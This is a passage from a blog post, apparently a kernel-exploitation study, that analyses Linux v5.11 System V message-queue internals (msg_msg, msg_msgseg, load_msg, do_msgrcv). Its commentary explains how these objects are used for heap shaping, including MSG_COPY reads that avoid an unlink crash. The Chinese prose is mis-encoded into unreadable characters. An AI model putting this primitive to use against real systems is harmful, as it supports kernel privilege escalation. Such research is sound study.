<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="ç›¸å…³å†…å­˜ç»“æ„ï¼š"   >
          <a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="headerlink" title="ç›¸å…³å†…å­˜ç»“æ„ï¼š"></a>ç›¸å…³å†…å­˜ç»“æ„ï¼š</h6>
      <p>åœ¨ä¸€ä¸ª<code>msg_queue</code>é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>ä¸€æ¡æ¶ˆæ¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>ä¸¤æ¡æ¶ˆæ¯ï¼š</p>
<p>ä»¥<code>msg_queue</code>çš„<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶"></p>
</li>
</ul>
<p>åŒç†ï¼ŒåŒä¸€ä¸ª<code>msg_queue</code>æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>

        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li>ä½¿ç”¨<code>msgget()</code>å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„<code>msg_msgseg</code>ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„<code>id</code>æ ‡å¿—<code>queue_id</code><ul>
<li><code>msg_msgseg</code>ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ<code>kmalloc-256</code>ã€‚</li>
<li>å…¶<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</li>
</ul>
</li>
<li>æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—<code>queue_id</code>ä¸‹è°ƒç”¨<code>msgsnd()</code>å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msg</code>ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº<code>0x400-0x30</code>å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„<ul>
<li><code>msg_msg</code>ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸<code>msg_queue</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸<code>msg_msgseg</code>å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº<code>kmalloc-64</code>è‡³<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨<code>msg_msg</code>å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º<code>0x400</code>ï¼Œå±äº<code>kmalloc-16</code>è‡³<code>kmalloc-1024</code>ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„ã€‚</li>
</ul>
</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶"   >
          <a href="#B-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>è°ƒç”¨å®Œ<code>alloc_msg()</code>å‡½æ•°åï¼Œå›åˆ°<code>load_msg()</code>å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾"   >
          <a href="#â‘¡é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹<code>do_msgrcv()</code>å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†</span></span><br><span class="line">        <span class="comment">//ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤</span></span><br><span class="line">    <span class="comment">//åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"   >
          <a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="headerlink" title="A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"></a>A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</h5>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ<code>MSG_COPY</code>è¿™ä¸ª<code>msgflg</code>æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„<code>unlink</code>è§¦å‘é”™è¯¯ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®<code>CONFIG_CHECKPOINT_RESTORE=y</code>æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>ğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„<code>v5.11</code>ä¸­ï¼Œ<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº<code>copy_msg()</code>å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>æ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–<code>rdi(msg)</code>å’Œ<code>rsi(copy)</code>å¯¹åº”çš„<code>m_ts</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ<code>copy</code>çš„<code>m_ts</code>æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„<code>msg</code>çš„<code>m_ts</code>é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚</p>

        <h5 id="B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"   >
          <a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="headerlink" title="B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"></a>B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</h5>
      <p>åŒç†å¦‚æœä¸æŒ‡å®š<code>MSG_COPY</code>è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>mtype</code>å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>msgtpy</code>æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚</p>

        <h5 id="C-æ•°æ®å¤åˆ¶"   >
